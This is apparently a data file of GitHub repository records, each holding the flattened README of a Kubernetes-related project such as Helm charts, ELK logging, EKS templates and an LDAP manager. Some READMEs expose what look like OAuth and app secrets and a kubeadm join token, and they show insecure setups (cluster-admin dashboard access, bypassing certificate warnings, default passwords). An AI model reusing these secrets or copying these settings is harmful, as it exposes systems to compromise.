sakura-internet,cert-manager-sacloud-webhook-helm-chart,certmanager#helm#k8s#kubernetes#manifest#yaml,Cert manager https img shields io badge version v1 0 0 green KubernetesCert managerWebhookCert manager Cert manager Cert manager bash kubectl create namespace cert manager helm repo add jetstack https charts jetstack io helm repo update kubectl apply validate false f https github com jetstack cert manager releases download v1 0 4 cert manager crds yaml helm install cert manager jetstack cert manager namespace cert manager version v1 0 4 Webhook HelmCert managerwebhook bash helm repo add cert manager sacloud webhook https sakura internet github io cert manager sacloud webhook helm chart helm install cert manager sacloud webhook cert manager sacloud webhook cert manager sacloud webhook namespace cert manager version v1 0 0 NginxIssuerCertificateSecretTLS yaml bash kubectl apply f examples cert manager sacloud webhook issuer yaml kubectl apply f examples cert manager sacloud webhook certificate yaml kubectl apply f examples cert manager sacloud webhook nginx yaml HelmLint bash helm lint charts cert manager sacloud webhook helm package charts cert manager sacloud webhook charts cert manager sacloud webhook tgz https cert manager io docs concepts webhook https helm sh docs topics chartrepository,2020-12-14T03:02:16Z,2020-12-21T07:57:17Z,HTML,Organization,3,1,0,8,master,0n1shi,1,0,0,0,0,0,0
apimeister,tibco-ems-operator,ems#k8s#operator#rust#tibco#tibco-ems,tibco ems operator This project is a work in progress It is not yet functional and I will update this readme if the operator is ready to use available ENV properties name cardinality value description KUBERNETESSERVICEHOST required kubernetes default svc cluster local references the api server if not present the rust TLS will fail because it cannot validate the IP of the API server STATUSREFRESHINMS required 10000 how often statistics are refreshed KUBERNETESNAMESPACE required ref metadata namespace what namespace should be captured SERVERURL required tcp ems 7222 USERNAME required user PASSWORD required password ADMINCOMMANDTIMEOUTMS optional 60000 command timeout in milliseconds default is 60000,2020-09-06T17:18:27Z,2020-11-20T22:00:13Z,Rust,Organization,1,1,0,34,main,JensWalter,1,0,0,0,0,0,0
bhuone-garbu,ms-ticketing,async-events#concepts#docker#experimentation#express#k8s#kubernetes#microservices#mongoose#nats-streaming-server#nextjs#nodejs#react#skaffold#stripe#typescript,Bhuwan Garbuja Intro This is a second part after learnings from previous experimentation https github com bhuone garbu ms blog to build microservice and cover more concepts Tech Stack An attempt to build a proper Full Stack ticket booking system with microservices The front end FE is less of a focus on this project NodeJS Express TypeScript based React Next js JavaScript based Docker Kubernetes k8s Ingress Nginx Skaffold MongoDB NATS Streaming Server Stripe for payments Some concepts I ve covered or will cover for reference Communicating services within a k8s cluster Server side rendering with Next js Authentication strategies Designing micro services with k8s object configs Use of NATS Streaming Server Handling concurrency with async events OCC Optimistic concurrency control idea with Mongoose MongoDB Bull library with Redis queue for delayed tasks processing Using Github Actions Getting started TODO Install kubectl either via Docker for Mac Windows or via minikube Reminder The following secrets are needed to be shared and accessible to the cluster jwt secret JWTKEY stripe secret STRIPEKEY kubectl create secret generic jwt secret from literal JWTKEY somescret kubectl create secret generic strip secret from literal STRIPEKEY strip secret key All the deployments of object configuration for k8s are inside the infra k8s director Check the README over there too to view more inital requirements Dev environment The following stack are assumed installed in the machine and working Docker Kubernetes Skaffold www skaffold dev Currently the projects uses ticketing dev for the main root url Set your hosts file to point this domain to localhost or 127 0 0 1 Then run command on the root of this project to deploy all the services skaffold dev Prod deployment Using digital ocean doctl auth login To create cluster context for kubectl doctl kubernetes cluster kubeconfig save In case new to view contexts or switch context kubectl config view kubectl config use context,2020-10-28T18:42:34Z,2020-11-19T13:06:17Z,TypeScript,User,1,1,0,164,main,bhuone-garbu,1,0,0,0,0,0,9
handsomestWei,elk-docker,dingding#docker#elasticsearch#elk-stack#filebeat#k8s#kibana#logstash#pod#sentinl,ELK https github com handsomestWei elk docker blob master resources elk docker jpg Filebeat Filebeat 5 5 1 Logstash Logstash 6 5 4 Elasticsearch Elasticsearch 6 8 4 Kibana Sentinl Kibana 6 8 4 Redis Filebeat registry filebeat mkdir root elk filebeat data cat root elk filebeat data registry EOF docker v root elk filebeat data usr share filebeat data filebeat yml pod var log pods nameSpaceimageName imageName log filebeat symlinks true includelines ERR error multiline pattern log u0009 at 3 b Caused by multiline negate false multiline match after Redis filebeatredisredis Logstash filedemo conf mutate filter mutate removefield version type removetag beatsinputcodecplainapplied es if imageName err in tags elasticsearch hosts esIpAddr 9200 index imageName err YYYY MM dd stdout codec rubydebug sincedb inputlogstash sincedb input file path xxx log type log startposition beginning sincedbpath xxx xx sincedbwriteinterval 10 Elasticsearch data mkdir root elk es data chmod 777 root elk es data docker v root elk es data usr share elasticsearch data Kibana sentinl kibana sentinlgit https github com lmangani sentinl sentinl docker pull wjy2020 kibana with sentinl 6 8 4 sentinl 5 trigger schedule later every 5 minutes 6 input search request index imageName err body query bool filter range timestamp from now 6m 1 condition script script payload hits total 1 5 actions Webhookb32fa3de 0028 40b2 9880 a31a6c6bf188 name dingding Webhook throttleperiod 5 webhook priority low stateless false method POST host oapi dingtalk com port 443 path robot send accesstoken qwer body n msgtype text n text n content XXnwatcher titlepayload hits total n n params watcher watcher title payloadcount payload hits total headers Content Type application json auth message usehttps true ESfilebeat https www elastic co cn beats filebeat ESlogstash https www elastic co cn logstash ES https www elastic co cn elasticsearch ESkibana https www elastic co cn kibana kibanasentinl https github com lmangani sentinl logstash https doc yonyoucloud com doc logstash best practice cn index html,2020-09-21T07:34:29Z,2020-12-15T09:12:42Z,Shell,User,1,1,0,6,master,weijiayu2018#handsomestWei,2,0,0,0,0,0,0
880831ian,kubernetes-elk,,Kubernetes K8s ELK Log 109 DockerKubernetesKubernetesELKElasticsearchLogstash Kibana LoglogELK LogKubernetes IPIP QQ K8s https blog tomy168 com 2019 08 centos 76 kubernetes html elk https surprised128 medium com use elk to monitor docker container b2d5903920e2 elk https github com deviantony docker elk git elk docker https elk docker readthedocs io disabling ssl tls minikube https minikube sigs k8s io docs start elasticsearch Kibana fluentd https mherman org blog logging in kubernetes with elasticsearch Kibana fluentd k8s 3 master Dashboard master ELK minikube elastic yaml kibana yaml fluentd rbac yaml fluentd daemonset yaml image https github com 880831ian kubernetes elk blob main images 13 png 1 Mac OSParallels Desktop3 https www parallels com hk products desktop image https github com 880831ian kubernetes elk blob main images 1 png 2 masternode1node2 image https github com 880831ian kubernetes elk blob main images 2 png 3 CPU2coreRam2GMemory 32GB image https github com 880831ian kubernetes elk blob main images 5 png 4 image https github com 880831ian kubernetes elk blob main images 6 png 5 hostname image https github com 880831ian kubernetes elk blob main images 8 png 6 root image https github com 880831ian kubernetes elk blob main images 10 png K8s 1 git 3 sh git clone https github com 880831ian kubernetes elk git image https github com 880831ian kubernetes elk blob main images 15 png 2 k8s sh master ip etc hosts sh sh k8s sh 10 211 55 37 image https github com 880831ian kubernetes elk blob main images 16 png 3 Log cat log txt image https github com 880831ian kubernetes elk blob main images 18 png 4 Elasticsearch5vm maxmapcountsysctl w etc sysctl conf sysctl vm maxmapcount sysctl w vm maxmapcount 262144 image https github com 880831ian kubernetes elk blob main images 41 png image https github com 880831ian kubernetes elk blob main images 40 png 1 master sh kubeadm init apiserver advertise address 10 211 55 37 pod network cidr 10 244 0 0 16 service cidr 10 96 0 0 12 kubernetes version v1 15 2 cri socket var run dockershim sock image https github com 880831ian kubernetes elk blob main images 19 png 2 joinnode1node2 image https github com 880831ian kubernetes elk blob main images 20 png 3 flannel sh mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml image https github com 880831ian kubernetes elk blob main images 21 png 4 node1node2 sh kubeadm join 10 211 55 37 6443 token gny70m 2v41qsd2t3jllxk discovery token ca cert hash sha256 f25d9d5d03fe993976daa053f23c546fa946cb6faa92c82c5c1946806aa57932 image https github com 880831ian kubernetes elk blob main images 22 png 5 1 sh kubectl get nodes image https github com 880831ian kubernetes elk blob main images 23 png 1 Dashboard master sh wget https raw githubusercontent com kubernetes dashboard v1 10 1 src deploy recommended kubernetes dashboard yaml image https github com 880831ian kubernetes elk blob main images 24 png 2 Dashboard 32222 port sh kind Service apiVersion v1 metadata labels k8s app kubernetes dashboard name kubernetes dashboard namespace kube system namespace kubernetes dashboard spec type NodePort ports port 443 targetPort 8443 nodePort 32222 selector k8s app kubernetes dashboard image https github com 880831ian kubernetes elk blob main images 25 png 3 Dashboard sh vim admin sa yaml kind ClusterRoleBinding apiVersion rbac authorization k8s io v1beta1 metadata name admin annotations rbac authorization kubernetes io autoupdate true roleRef kind ClusterRole name cluster admin apiGroup rbac authorization k8s io subjects kind ServiceAccount name admin namespace kube system apiVersion v1 kind ServiceAccount metadata name admin namespace kube system labels kubernetes io cluster service true addonmanager kubernetes io mode Reconcile image https github com 880831ian kubernetes elk blob main images 26 png 4 sh kubectl create f kubernetes dashboard yaml kubectl apply f admin sa yaml image https github com 880831ian kubernetes elk blob main images 27 png 5 dashboardpassword txt sh kubectl n kube system describe secret kubectl n kube system get secret grep admin token cut d f1 grep token tr s cut d f2 passwd txt image https github com 880831ian kubernetes elk blob main images 28 png 6 https IP 32222 https google chromethisisunsafe image https github com 880831ian kubernetes elk blob main images 29 png 7 dashboard image https github com 880831ian kubernetes elk blob main images 30 png 8 kubernetes dashboardtimeout sh token ttl 43200 image https github com 880831ian kubernetes elk blob main images 31 png 9 image https github com 880831ian kubernetes elk blob main images 32 png image https github com 880831ian kubernetes elk blob main images 33 png 1 metrics server master sh wget https github com kubernetes sigs metrics server archive v0 3 6 tar gz tar zxvf v0 3 6 tar gz cd metrics server 0 3 6 deploy 1 8 image https github com 880831ian kubernetes elk blob main images 35 png 2 metrics server sh vim metrics server deployment yaml name metrics server image k8s gcr io metrics server amd64 v0 3 3 imagePullPolicy IfNotPresent command metrics server kubelet preferred address types InternalIP kubelet insecure tls volumeMounts name tmp dir mountPath tmp image https github com 880831ian kubernetes elk blob main images 36 png 3 metrics server sh kubectl apply f image https github com 880831ian kubernetes elk blob main images 37 png 4 image https github com 880831ian kubernetes elk blob main images 38 png image https github com 880831ian kubernetes elk blob main images 39 png minikube 1 minikube rpm sh curl LO https storage googleapis com minikube releases latest minikube latest x8664 rpm sudo rpm ivh minikube latest x8664 rpm image https github com 880831ian kubernetes elk blob main images 42 png 2 minikube sh minikube start image https github com 880831ian kubernetes elk blob main images 43 png 3 minikube sh minikube start memory 8192 cpus 4 image https github com 880831ian kubernetes elk blob main images 44 png 4 sh kubectl create namespace logging image https github com 880831ian kubernetes elk blob main images 45 png elastic yaml 1 Elasticsearch docker image sh docker pull docker elastic co elasticsearch elasticsearch 7 10 0 image https github com 880831ian kubernetes elk blob main images 46 png 2 elastic yaml sh cat elastic yaml image https github com 880831ian kubernetes elk blob main images 47 png 3 elastic yamllogging sh kubectl create f elastic yaml n logging image https github com 880831ian kubernetes elk blob main images 48 png 4 K8selasticsearch sh kubectl get pods n logging kubectl get service n logging curl ip 31985 image https github com 880831ian kubernetes elk blob main images 49 png image https github com 880831ian kubernetes elk blob main images 50 png kibana yaml 1 kibana docker image sh docker pull docker elastic co kibana kibana 7 10 0 image https github com 880831ian kubernetes elk blob main images 51 png 2 kibana yaml sh cat kibana yaml image https github com 880831ian kubernetes elk blob main images 52 png 3 kibana yamllogging sh kubectl create f kibana yaml n logging image https github com 880831ian kubernetes elk blob main images 53 png 4 K8skibana sh kubectl get pods n logging kubectl get service n logging curl ip 30526 image https github com 880831ian kubernetes elk blob main images 54 png image https github com 880831ian kubernetes elk blob main images 55 png image https github com 880831ian kubernetes elk blob main images 56 png fluentd rbac yaml 1 fluentd rbac yaml sh cat fluentd rbac yaml image https github com 880831ian kubernetes elk blob main images 58 png 2 fluentd rbac yaml sh kubectl create f fluentd rbac yaml image https github com 880831ian kubernetes elk blob main images 59 png fluentd daemonset yaml 1 fluentd daemonset yaml sh cat fluentd daemonset yaml image https github com 880831ian kubernetes elk blob main images 60 png 2 fluentd daemonset yaml sh kubectl create f fluentd daemonset yaml image https github com 880831ian kubernetes elk blob main images 61 png 3 K8sfluentd sh kubectl get pods n kube system watch grep fluentd image https github com 880831ian kubernetes elk blob main images 62 png image https github com 880831ian kubernetes elk blob main images 63 png 1 nginx sh kubectl create deployment nginx image nginx kubectl create service nodeport nginx tcp 80 80 kubectl get pods kubectl get svc image https github com 880831ian kubernetes elk blob main images 64 png 2 image https github com 880831ian kubernetes elk blob main images 65 png 3 K8snginx image https github com 880831ian kubernetes elk blob main images 66 png 4 K8snginx3 image https github com 880831ian kubernetes elk blob main images 67 png 4 kibana image https github com 880831ian kubernetes elk blob main images 68 png 5 index pattern logstash image https github com 880831ian kubernetes elk blob main images 69 png 6 timestamp image https github com 880831ian kubernetes elk blob main images 70 png 7 logfields image https github com 880831ian kubernetes elk blob main images 71 png image https github com 880831ian kubernetes elk blob main images 72 png 8 image https github com 880831ian kubernetes elk blob main images 73 png 9 nginxk8snginx image https github com 880831ian kubernetes elk blob main images 74 png image https github com 880831ian kubernetes elk blob main images 75 png 10 image https github com 880831ian kubernetes elk blob main images 76 png 11 ELK Log nginx image https github com 880831ian kubernetes elk blob main images 77 png 12 image https github com 880831ian kubernetes elk blob main images 78 png 13 ELK Log image https github com 880831ian kubernetes elk blob main images 79 png,2020-11-21T16:26:56Z,2020-12-13T09:46:01Z,Shell,User,1,1,0,196,main,880831ian,1,0,0,0,0,0,0
gianluca-mascolo,squid-kubeio-filter,certification#ckad#ckad-exercises#documentation#k8s#kubernetes#squid#url-filter,squid kubeio filter Goal I m preparing for Kubernetes certification Since the only website allowed during the exam is the official kubernetes io https kubernetes io docs home documentation I wrote a squid proxy configuration that allow me to stuck on that site while study Requirements This PoC is meant to be run on minikube so you must have it installed and running on your computer Just apply the yaml file with kubectl apply f squid yaml It use the following images on Docker Hub b4tman squid https hub docker com r b4tman squid source https github com b4tman docker squid rnix openssl gost https hub docker com r rnix openssl gost source https github com rnixik docker openssl gost Howto After resource creation on Kubernetes you need to configure your browser to use a proxy with a custom certificate to access the Internet SSL Certificate You can extract the custom certificate from the running squid with example kubectl get pods l app squid NAME READY STATUS RESTARTS AGE squid 764554f67f 9hcrl 1 1 Running 0 36m kubectl cp squid 764554f67f 9hcrl etc squid cert squid ca cert pem tmp squid ca cert pem Proxy Address The proxy is reachable from your computer at MinikubeIp NodePort Example kubectl get svc l app squid NAME TYPE CLUSTER IP EXTERNAL IP PORT S AGE squid NodePort 10 98 172 39 3128 32347 TCP 54m minikube ip 192 168 39 230 HTTP proxy address in the example is 192 168 39 230 32347 Browser configuration Configure your HTTP and HTTPS proxy to MinikubeIp NodePort do not forget HTTPS or the filter won t work Load the squid ca cert pem in your certification authorities list Extra Tip you can use a custom profile in your browser only for that e g with firefox P Notes You can monitor squid logs with kubectl logs f l app squid URL filter is customized to include resources coming from external sites into kubernetes io site This may change in future This configuration allow access to https kubernetes io docs and https kubernetes io search only Other sections like blog are forbidden,2020-09-09T08:11:10Z,2020-10-08T08:50:30Z,n/a,User,1,1,0,11,master,gianluca-mascolo,1,0,0,0,0,0,0
vincent-herlemont,bazel-pipeline-demo,bazel#docker#go#javascript#k8s#kubernetes#nextjs#python#rust#starlark,Goal Provide a full Bazel example using multi languages of a simple data pipeline with sensors consumers queues dispatchers databases api back web front The choices of languages and technologies apart from bazel are arbitrary In this repository you can found an integration between Bazel and these technologies Live Demo 8631fdac 7d58 45ac 974f c0f2171ac1a2 nodes k8s fr par scw cloud http 8631fdac 7d58 45ac 974f c0f2171ac1a2 nodes k8s fr par scw cloud Services Each service corresponds to a folder at the root repository senror Go Send an random number to dispatcher dispatcher Go Wait data from sensor s and send them to rabbitmqp rabbitmq Rabbitmq services consumer Rust Retrieved from rabbitmqp store data to Postgresql postgresql Postgresql services graphql Node Apollo Create api from Postgresql data web JS Node Display data from graphql endpoint Can be outsourced of the cluster hosted by Vercel for example Bazel one command for all code deliveries steps Bazel allow to describe and bring together all steps of code delivery with multiple languages Install Install bazel https docs bazel build versions master install html and ibazel https github com bazelbuild bazel watcher for live reload Add this env variables to your bashrc or profil or others init shell file bash export REGISTRY docker local 5000 pipeline demo export CLUSTER minikube export REGISTRYAUTH False export POSTGRESPASSWORD admin123 export RABBITMQDEFAULTPASS guest Build all bazel build Get started locally Start a local docker registry bash docker run d p 5000 5000 name registry registry 2 Install minikube https minikube sigs k8s io docs start and kubectl https kubernetes io docs tasks tools install kubectl Start minikube with insecure docker registry local registry bash minikube start insecure registry docker local 5000 Go inside minikube with minikube ssh We have to allow services inside minikube to reach docker local 5000 Install vim sudo apt update sudo apt install y vim Edit sudo vim etc hosts Add docker local entry with the ip of the host host minikube internal Entry example 192 168 49 1 docker local You must do it after each time that minikube start Add ingress addon minikube addons enable ingress Ingress allow to reach http services inside k8s Open the dashboard with minikube dashboard This web app allow to display the big picture of the k8s state Run all bazel run all create Reach nginx ingress ingress yaml IP the entry point of all applications bash Command kubectl get ingress nginx ingress Ouput NAME CLASS HOSTS ADDRESS PORTS AGE nginx ingress 192 168 49 2 80 13m Test bash Command curl http 192 168 49 2 Ouput Golang dispatcher Tests Requirements google auth install with command pip install google auth Run tests bazel test Test live use ibazel and debug use testoutput all bash Example with dispatcher ibazel test dispatcher test testoutput all Development Build deploy and test unit and integration test bazel run apps apply bazel test Need more faster You can restrict the scope of build and deployment Example by deploying only the dispatcher bash bazel run dispatcher app apply bazel test You can also restrict tests Example by executing only dispatcher unit tests bash bazel run dispatcher app apply bazel test dispatcher test Development front standalone Use NextJS with endpoint mapping from localcluster web run sh ready started server on http localhost 3000 Rust Add dependencies Add dependecies to Cargo toml Run cargo raze in the package folder Go Add dependencies Add dependencies to go mod Run bazel run gazelle update repos fromfile go mod Tools Log Local Remote stream log Stern https github com wercker stern display pod log example stern Cli Package util tools provide some shortcuts for get service urls or cluster urls in development mode bash cd bazel build util tools bazel bin util tools tools Usage tools py OPTIONS COMMAND ARGS Options help Show this message and exit Commands get cluster url get service url Troubleshooting JS Lock file update and generation have to do manually emaple with front package bash cd front npm i package lock only,2020-11-03T15:23:33Z,2020-12-27T17:57:31Z,Starlark,User,1,1,1,61,master,vincent-herlemont,1,0,0,6,0,6,6
apulis,user-dashboard-frontend,ai#docker#go#k8s#mindspore#python#resnet50#tensorflow,1 1 yarn 2 yarn build 3 yarn run static 3083 yarn run static 4000 4000 4 custom user dashboard nginx 5 custom user dashboard backend 2 custom user dashboard user login redirect redirect redirect url encode custom user dashboard user register custom user dashboard backend auth wechat to to to http localhost 8000 custom user dashboard backend auth microsoft to to,2020-09-01T04:03:11Z,2020-10-29T11:18:34Z,TypeScript,Organization,1,1,0,501,master,xianjiezh#Tiquiero#nautilusshell#banrieen,4,1,1,0,0,0,0
balmiusf,minecraft-kube,docker#dockerfile#google-cloud#google-kubernetes-engine#k8s#kubernetes#minecraft#minecraft-server#minikube,Minecraft on Kubernetes In this repository you will two different minecraft servers that have been tested on Minikube And Google Kubernetes Engine GKE Vanilla Server using a custom image created by me under vanilla Feed the Beast modsss using itzg docker image https github com itzg docker minecraft server under ftb,2020-08-22T14:12:51Z,2020-09-22T14:01:54Z,Dockerfile,User,1,1,0,16,master,balmiusf,1,0,0,0,0,0,1
apulis,user-dashboard-backend,ai#docker#go#k8s#mindspore#python#resnet50#tensorflow#typescript,1 develop env Log LOGGINGDIR logs LOGGINGLEVEL debug Auth JWTSECRETKEY Sign key for JWT SECRETKEY Sign key for Password OAuth MSCLIENTID 6d93837b d8ce 48b9 868a 39a9d843dc57 MSCLIENTSECRET eIHVKiG2TlYa387tssMSj E qVGvJi WXAPPID wx403e175ad2bf1d2d WXSECRET dc8cb2946b1d8fe6256d49d63cd776d0 Server APPHOST localhost APPPORT 5001 Database DBHOST localhost DBTYPE mysql DBPORT 3306 DBUSERNAME root DBPASSWORD 123456 DBNAME usergroup ADMINISTRATORUSERNAME xianjie han ADMIN ADMINISTRATORPASSWORD 123456 JWTSECRETKEY JWT key SECRETKEY ADMINISTRATORUSERNAME admin Array 2 yarn config set registry https registry npm taobao org yarn yarn build 3 redis docker docker run p9301 6379 redis 9301 redis yarn start prod 4 Table typeorm,2020-09-01T04:04:09Z,2020-10-30T10:05:10Z,TypeScript,Organization,1,1,0,380,master,xianjiezh#banrieen#aurorazl,3,1,1,0,0,0,0
jeanbaptisteng,ubuntueks-cloudformation,amazon#amazon-eks#aws#cloudformation#k8s#kubernetes#spot-instances#ubuntu,Ubuntu EKS CloudFormation Script for extra package installation for Amazon EKS This is an unoffical Cloudformation template to build Ubuntu based of EKS node group with extra system package ie Glusterfs nfs installed Most of this is one time setup If you already have an EKS cluster and familar with Cloudformation please download the template and skip to the last step This Cloudformation template was written based on official Amazon Linux CloudFormation Template Dependencies The tools required to implement the whole cluster and workernode group is very simple Just the latest version of awscli https aws amazon com cli and web browser that can access AWS WebConsole is enough Downloads Both CloudFormation Template for on demand instances autoscaling group and spot instances autoscaling group are availiable here Yes we support SPOT instances On Demand Instance https raw githubusercontent com jeanbaptisteng ubuntueks cloudformation master Ubuntu yaml SPOT Instance https raw githubusercontent com jeanbaptisteng ubuntueks cloudformation master Ubuntu spot yaml Quickstart New EKS cluster Installation 1 Create EKS role that include the follow permission to allow EKS cluster to manage resources in EKS ie arn aws iam XXXXXXXXXX role eksServiceRole arn aws iam aws policy AmazonEKSClusterPolicy arn aws iam aws policy AmazonEKSServicePolicy arn aws iam aws policy AmazonEKSVPCResourceController 2 Create EC2 role that include the follow permission in order to create and control the EKS cluster on the baston host ie arn aws iam XXXXXXXXX role eks controller prd Policy 1 Version 2012 10 17 Statement Effect Allow Action sts eks Resource Effect Allow Action iam Resource arn aws iam XXXXXXXXXX role eksServiceRole Policy 2 AmazonEKSClusterPolicy 3 Execute the following command to create a new EKS private cluster aws eks create cluster name EKS cluster name role arn EKS role in Step 2 resources vpc config subnetIds Internal Subnet 1 Internal Subnet 2 Internal Subnet 3 securityGroupIds New SG that enable traffic within SG endpointPublicAccess false endpointPrivateAccess true tags Tag region AWS Region 4 Gather the EKS Cluster information in AWS WebConsole https console aws amazon com eks home Ubuntu WorkerNode Group setup 1 Open CloudFormation Webconsole https console aws amazon com cloudformation in Web Browser 2 Click Create Stack With existing resources standard to enter Create stack page 3 Select Template is ready Upload a template file 4 In the dialogue choose the template downloaded from the git 5 Check the Ubuntu EKS AMI ID from Official link https cloud images ubuntu com docs aws eks 6 Fill in the blanks and select the desired size of the EC2 instance of the EKS WorkerNode group 7 Confirm the information before creating resources related to the CloudFormation Template 8 Check the new IAM role attached on new workernode in EC2 webconsole for new workernode group only aws auth cm yaml apiVersion v1 kind ConfigMap metadata name aws auth namespace kube system data mapRoles rolearn username system node EC2PrivateDNSName groups system bootstrappers system nodes 8 Apply the configuration This command may take a few minutes to finish kubectl apply f aws auth cm yaml License This is licensed under GNU GENERAL PUBLIC LICENSE Components enhancing Kubernetes Cluster NodelocalDNS https github com jeanbaptisteng bottlerocket cloudformation tree master plugins NodeLocalDNS See also Ubuntu on Amazon Elastic Kubernetes Service EKS https cloud images ubuntu com docs aws eks,2020-11-12T09:53:41Z,2020-12-19T13:33:08Z,n/a,User,1,1,0,2,master,jeanbaptisteng,1,0,0,0,0,0,0
weidong1314,easyenvironment,,easyenvironment CentOS7RedisMySQLMyCatSpring Cloud NetflixSpring Cloud AlibabaDubboConsulZookeeperDockerElasticSearchNginxK8S mongoDBRocketMQKafkaRabbitMQActiveMQ,2020-12-04T15:25:50Z,2020-12-06T11:07:30Z,n/a,User,1,1,0,7,main,weidong1314,1,0,0,0,0,0,0
structure-projects,structure-dependencies,,structure dependencies structure dependencies spring bootspring cloudalibaba cloudk8s structure version spring boot version spring cloud version alibaba cloud version spring alibaba cloud version kubernetes version 1 0 X 2 1 X RELEASE Greenwich SR2 2 1 2 RELEASE 0 9 0 RELEASE 1 1 6 RELEASE structure dependencies spring boot structure dependencies xml cn structured structure dependencies last version pom import starter xml cn structured structure dependencies last version,2020-12-17T02:01:16Z,2020-12-22T15:32:04Z,n/a,Organization,0,1,0,17,master,lchqJava#chuckLcq,2,2,2,0,0,0,0
ravinayag,HL-StartertKit,chaincode#configurator-services#consensus#custom#custom-chaincode#endorsement#fabric#hlf#k8s#peer#sacc#sawtooth,HL learnerscript Hyperledger CLI Config Generator Tool HLStarterkit Automation Disclaimer Its fork from Hyperledger fabric samples https github com hyperledger fabric samples On personal Interest I created this Devops Automation for HL Learners Startup Community I m looking for testers Scripters to fine tune this tool to make available for everyone s use Currently I m Optimizing the code and waiting for UAT from learners community I will be posting the code soon Hyperledger Fabric network is now Automated with Custom Configuration creator The tools consists of Advance Shelling scripting Ansible and Python By Default the configurator tool generates with Two ORGS and two Peers an extension of BYFN model for Sample What you can do with this Tool dynamically 1 You can Create Change your DOMAIN NAME ORGS Orderer Peer and CA Names 2 You can Create Change Channel Names 3 You Can Toggle between the Consensus type 4 You can Toggle between HLF Fabric Versions and dependencies 5 You can Deploy the Fabric network Single node Multinode using DockerSwarm Kubernatees 6 You can select the Blockchain Network Between Hyperledger Frame Works Ex Fabric Besu Sawtooth besu sawtooth under devlopment 7 You can extend your Org Dynamically with custom name 8 You can Upgrade your chaincode after Endorsement Chaincode changes 9 You can deploy Private Data channels 10 You have choice to select sample chaincodes or deploy custom chaincode as per fabric version This can be deployed on local system to generate config and test You can also use it to deploy and test your own Fabric chaincodes and applications To get started see the demo video Test Case Ready and To do 1 Fabric 1 4 x 2 x Basic with 2 orgs and above is ready with example chaincode02 in single host Ready 2 Fabric 1 4 explorer ready Ready 3 HLF Pre requisties Ready 4 Generate config and send email with attachment Ready 5 Fabric 1 4 x 2 x Basic with 2 orgs and above is ready with example chaincode02 in Docker Swarm network Swarm Network is not ready for web Config generation 6 Consensus type etcdRaft Solo customaisation Ready 7 Kubernatees with basic extended deployment for 1 4x and 2 x Tested with 2 x 8 Samples 1 4x SACC 2 x Asset transfer Basic SACC ABAC Ready Todo 9 Privatedata with private channel 10 Add option for Custom chaincode Approching Chain code developers 11 Add other chaincodes for test 12 Optimize the scripts 13 Customaisation for endorsement methods 14 Customaisation code for SACC,2020-11-21T14:16:00Z,2020-12-14T07:47:46Z,Shell,User,1,1,0,1,master,ravinayag,1,1,1,0,1,0,0
TwinProduction,aws-eks-auto-tagger,auto-tagger#auto-tagging#aws#ebs#ebs-volumes#eks#hacktoberfest#k8s#persistent-volume#persistent-volumes#tagging,aws eks auto tagger Docker pulls https img shields io docker pulls twinproduction aws eks auto tagger svg https cloud docker com repository docker twinproduction aws eks auto tagger Go Report Card https goreportcard com badge github com TwinProduction aws eks auto tagger https goreportcard com report github com TwinProduction aws eks auto tagger Automatically tags all EBS volumes that are tagged with kubernetes io cluster CLUSTERNAME owned There s no way to automatically add one or multiple tags to an EBS that was created by a PersistentVolume By leveraging the aforementioned default tag this application is able to iterate over all EBS volumes that are owned by the cluster and add one or multiple tags to each EBS volume Environment variables Key Description Default value TAG Tag to add to the resources The tag name will be the name of the variable stripped of the TAG prefix and the tag value will be the value assigned to the variable N A CLUSTERNAME Name of the EKS cluster Used to search for EBS volumes that belong to the cluster i e by looking for the tag kubernetes io cluster CLUSTERNAME owned required AWSREGION Name of AWS region required EBSTAGGINGENABLED Whether to automatically tag EBS volumes or not true OVERWRITEIFDIFFERENTTAGVALUE Whether to overwrite the tag if it already exists but with a different value false EXECUTIONINTERVALINMINUTES Time to wait between each run in minutes 10 Permissions To function properly this application requires the following permissions on AWS ec2 CreateTags ec2 DescribeVolumes Developing Make sure to set the required environment variables and consider whether you want the EBS Volumes to be tagged or not If you just want to test it you can set EBSTAGGINGENABLED to false and the creation of the tags will be skipped Your local aws credentials must also be valid i e you can use awscli,2020-08-19T18:07:53Z,2020-10-29T01:56:11Z,Go,User,2,1,0,5,master,TwinProduction,1,0,0,1,0,0,0
romnnn,ldap-manager,authentication#cloud-native#golang#grpc#helm#k8s#kubernetes#ldap#management#rest#user-management#website,ldap manager Build Status https travis ci com romnnn ldap manager svg branch master https travis ci com romnnn ldap manager GitHub https img shields io github license romnnn ldap manager https github com romnnn ldap manager Docker Pulls https img shields io docker pulls romnn ldap manager https hub docker com r romnn ldap manager Test Coverage https codecov io gh romnnn ldap manager branch master graph badge svg https codecov io gh romnnn ldap manager Release https img shields io github release romnnn ldap manager https github com romnnn ldap manager releases latest LDAP Manager is the cloud native LDAP web management interface LDAP has been around for a long time and has become a popular choice for user and group management however this should not mean that it s management interface should be hard to deploy and look and feel like it was made in the last century LDAP Manager is written in Go and comes with a Vue Typescript frontend in a single self contained docker container It also exposes it s API over both REST and gRPC Before you get started make sure you have an OpenLDAP server like osixia openldap https hub docker com r osixia openldap running For more information on deployment and a full example see the deployment guide Deployment bash go run github com romnnn ldap manager cmd ldap manager serve http port 8080 grpc port 9090 generate You can also download pre built binaries from the releases page https github com romnnn ldap manager releases or use the docker image bash docker run p 8080 80 p 9090 9090 romnn ldap manager generate For a list of options run with help If you want to deploy OpenLDAP with LDAP Manager read along Deployment docker compose bash docker compose f deployment docker compose yml up k8s via helm TODO Considerations Serving the frontend externally If you have a cluster environment and want to scale the ldap manager container individually or use a more performant static content server like nginx you can disable serving static content using the no static NOSTATIC flag Development Prerequisites Before you get started make sure you have installed the following tools python3 m pip install U cookiecutter 1 4 0 python3 m pip install pre commit bump2version invoke ruamel yaml halo go get u golang org x tools cmd goimports go get u golang org x lint golint go get u github com fzipp gocyclo go get u github com mitchellh gox if you want to test building on different architectures Remember To be able to excecute the tools downloaded with go get make sure to include GOPATH bin in your PATH If echo GOPATH does not give you a path make sure to run export GOPATH HOME go to set it In order for your changes to persist do not forget to add these to your shells bashrc With the tools in place it is strongly advised to install the git commit hooks to make sure checks are passing in CI bash invoke install hooks You can check if all checks pass at any time bash invoke pre commit Note for Maintainers After merging changes tag your commits with a new version and push to GitHub to create a release bash bump2version major minor patch git push follow tags If you want to re generate the grpc service and gateway source files make sure to install protoc protoc gen go and protoc gen go grpc You can then use the provided script bash apt install y protobuf compiler go install github com grpc 